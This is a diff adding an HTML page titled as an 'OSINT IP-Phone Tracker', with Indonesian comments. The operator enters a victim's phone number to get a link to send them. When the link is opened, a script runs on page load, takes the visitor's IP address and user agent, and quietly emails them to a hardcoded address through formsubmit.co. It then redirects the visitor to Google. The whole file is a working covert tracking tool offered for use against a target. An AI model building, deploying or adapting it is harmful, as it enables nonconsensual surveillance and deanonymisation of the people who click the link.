@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>OSINT IP-Phone Tracker</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        .box { border: 2px solid #7f0000; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px #f00; max-width: 400px; margin: auto; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #7f0000; color: #0f0; outline: none; }
+        button { width: 100%; padding: 12px; background: #7f0000; color: #fff; border: none; cursor: pointer; font-weight: bold; }
+        .log-area { margin-top: 20px; text-align: left; font-size: 12px; color: #888; border-top: 1px solid #333; padding-top: 10px; }
+        #link-box { display: none; margin-top: 15px; background: #222; padding: 10px; border: 1px dashed #0f0; word-break: break-all; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2 style="color: #f00;">IP-PHONE BRIDGING</h2>
+        <p style="font-size: 10px;">TARGETING SYSTEM V1.0</p>
+        
+        <input type="text" id="targetPhone" placeholder="Masukkan No HP Target...">
+        <button onclick="generateLink()">GENERATE TRACKING LINK ⚡</button>
+
+        <div id="link-box">
+            <p style="color: #ff0;">Kirim link ini ke target:</p>
+            <span id="finalLink"></span>
+        </div>
+
+        <div class="log-area">
+            <div>STATUS: <span id="status">IDLE</span></div>
+            <div>TARGET: <span id="targetDisp">-</span></div>
+        </div>
+    </div>
+
+    <form id="ipForm" action="https://formsubmit.co/yudisparmban@gmail.com" method="POST" style="display:none;">
+        <input type="hidden" name="Subject" value="IP TARGET TERDETEKSI!">
+        <input type="hidden" name="TargetPhone" id="formPhone">
+        <input type="hidden" name="IP_Address" id="formIP">
+        <input type="hidden" name="UserAgent" id="formUA">
+        <input type="hidden" name="_next" value="https://google.com">
+    </form>
+
+    <script>
+        function generateLink() {
+            const phone = document.getElementById('targetPhone').value;
+            if(!phone) return alert("Nomornya mana, dongo!");
+
+            document.getElementById('status').innerText = "LINK READY";
+            document.getElementById('targetDisp').innerText = phone;
+            document.getElementById('link-box').style.display = 'block';
+            
+            // GANTI INI JADI LINK HOSTINGAN LO (Vercel/Github)
+            const myHosting = window.location.href; 
+            document.getElementById('finalLink').innerText = myHosting + "?target=" + phone;
+        }
+
+        // AUTO TRACK JIKA LINK DIKLIK TARGET
+        window.onload = async () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const target = urlParams.get('target');
+
+            if(target) {
+                // Ambil IP Target via API pihak ketiga
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    
+                    document.getElementById('formPhone').value = target;
+                    document.getElementById('formIP').value = data.ip;
+                    document.getElementById('formUA').value = navigator.userAgent;
+                    
+                    // Kirim ke email lo secara otomatis
+                    document.getElementById('ipForm').submit();
+                } catch(e) {
+                    console.log("Gagal bypass.");
+                }
+            }
+        };
+    </script>
+</body>
+</html>
